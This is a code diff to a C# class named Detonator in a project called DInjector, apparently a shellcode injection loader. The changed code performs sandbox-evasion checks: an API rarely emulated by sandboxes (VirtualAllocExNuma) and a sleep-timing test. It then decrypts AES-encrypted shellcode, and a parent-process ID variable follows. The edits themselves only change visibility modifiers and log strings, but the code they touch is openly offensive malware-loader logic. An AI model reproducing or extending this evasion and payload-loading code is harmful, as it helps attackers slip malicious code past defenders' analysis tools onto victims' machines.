@@ -9,10 +9,10 @@ using System.Runtime.InteropServices;
 
 namespace DInjector
 {
-    class Detonator
+    public class Detonator
     {
         [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-        private static extern IntPtr VirtualAllocExNuma(
+        static extern IntPtr VirtualAllocExNuma(
             IntPtr hProcess,
             IntPtr lpAddress,
             uint dwSize,
@@ -21,9 +21,9 @@ namespace DInjector
             UInt32 nndPreferred);
 
         [DllImport("kernel32.dll")]
-        private static extern void Sleep(uint dwMilliseconds);
+        static extern void Sleep(uint dwMilliseconds);
 
-        private static bool isPrime(int number)
+        static bool isPrime(int number)
         {
             bool calcPrime(int value)
             {
@@ -39,12 +39,12 @@ namespace DInjector
             return number > 1 && calcPrime(number);
         }
 
-        static void Boom(string[] args)
+        public static void Boom(string[] args)
         {
             // Check if we're in a sandbox by calling a rare-emulated API
             if (VirtualAllocExNuma(Process.GetCurrentProcess().Handle, IntPtr.Zero, 0x1000, 0x3000, 0x4, 0) == IntPtr.Zero)
             {
-                Console.WriteLine("(VirtualAllocExNuma) [-] Failed check");
+                Console.WriteLine("(Detonator) [-] Failed VirtualAllocExNuma check");
                 return;
             }
 
@@ -56,7 +56,7 @@ namespace DInjector
             Sleep(dream);
             if (DateTime.Now.Subtract(before).TotalSeconds < delta)
             {
-                Console.WriteLine("(Sleep) [-] Failed check");
+                Console.WriteLine("(Detonator) [-] Failed Sleep check");
                 return;
             }
 
@@ -127,7 +127,7 @@ namespace DInjector
                 shellcodeEncrypted = Convert.FromBase64String(shellcodePath);
             }
 
-            AES ctx = new(password);
+            AES ctx = new AES(password);
             var shellcodeBytes = ctx.Decrypt(shellcodeEncrypted);
 
             var ppid = 0;
